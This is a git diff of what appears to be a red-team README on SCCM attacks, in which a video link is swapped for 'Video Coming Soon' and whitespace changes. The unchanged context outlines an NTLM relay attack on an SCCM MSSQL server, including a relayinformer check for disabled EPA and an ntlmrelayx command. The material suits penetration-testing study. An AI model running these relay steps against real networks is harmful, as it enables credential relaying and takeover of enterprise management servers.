@@ -46,7 +46,7 @@ I learned these attacks through the amazing public research from [SpecterOps](ht
 
 
 ## MSSQL Relaying 
-[My Step-by-step Youtube Video](https://youtu.be/MM7RpPkMFRs)
+Video Coming Soon
 ### Requirements:
 - Any domain credentials
 - At least two SCCM servers with ONE having MSSQL service and EPA disabled
@@ -56,7 +56,7 @@ I learned these attacks through the amazing public research from [SpecterOps](ht
 
   
 ### Steps:
-1. Check for EPA disabled or turned off
+1. Check for EPA disabled or turned off  
 ```uv run relayinformer mssql --target <TARGET Hostname> --user <domain>/<username> --password <password>```
 2. Start ntlmrelayx targeting an SCCM MSSQL Server  
 ```python3 ntlmrelayx.py -t mssql://<TARGET IP> -smb2support –socks```
